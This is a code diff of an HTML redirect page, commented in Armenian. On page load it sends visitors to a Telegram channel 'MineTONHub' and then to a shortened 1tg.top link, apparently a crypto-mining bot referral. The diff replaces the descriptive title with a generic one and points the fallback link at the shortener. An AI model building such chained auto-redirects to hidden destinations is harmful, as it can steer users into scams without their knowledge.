@@ -2,18 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Redirecting to Telegram</title>
+  <title>Redirecting…</title>
   <script>
-    function redirectToBot() {
-      window.location.href = "https://t.me/MineTONHub";
-      setTimeout(function() {
-        window.open("https://1tg.top/7h5p7T_mwhlom?i=copy", "_blank");
-      }, 2000);
+    function redirectInSteps() {
+      setTimeout(function () {
+        // Քայլ 1․ ուղարկում է Telegram ալիք
+        window.location.href = "https://t.me/MineTONHub";
+      }, 1000);
+
+      setTimeout(function () {
+        // Քայլ 2․ հետո ուղարկում է բոտ՝ նույն պատուհանում
+        window.location.href = "https://1tg.top/7h5p7T_mwhlom?i=copy";
+      }, 4000);
     }
-    window.onload = redirectToBot;
+
+    window.onload = redirectInSteps;
   </script>
 </head>
 <body>
-  <p>Եթե ավտոմատ չտեղափոխվեցիր, սեղմիր այստեղ՝ <a href="https://t.me/MineTONHub">Telegram ալիք</a></p>
+  <p>Եթե ավտոմատ չտեղափոխվեցիր, սեղմիր <a href="https://1tg.top/7h5p7T_mwhlom?i=copy">այս հղման վրա</a></p>
 </body>
 </html>
